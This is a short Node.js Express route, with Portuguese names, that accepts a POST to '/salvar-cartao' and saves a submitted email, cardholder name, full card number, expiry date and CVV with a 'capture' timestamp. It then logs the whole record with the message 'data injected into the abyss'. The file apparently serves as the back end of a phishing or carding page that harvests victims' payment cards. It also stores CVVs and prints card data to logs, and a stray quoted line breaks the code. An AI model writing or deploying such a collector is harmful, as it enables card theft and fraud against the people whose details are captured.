const express = require('express');
const router = express.Router();
const Cartao = require('../models/Cartao');

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao,
      dataCaptura: new Date()
    });

    await novoCartao.save();
    console.log("🩸 Dado injetado no abismo:", novoCartao);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error("💀 Erro na salvação:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});
""

module.exports = router;
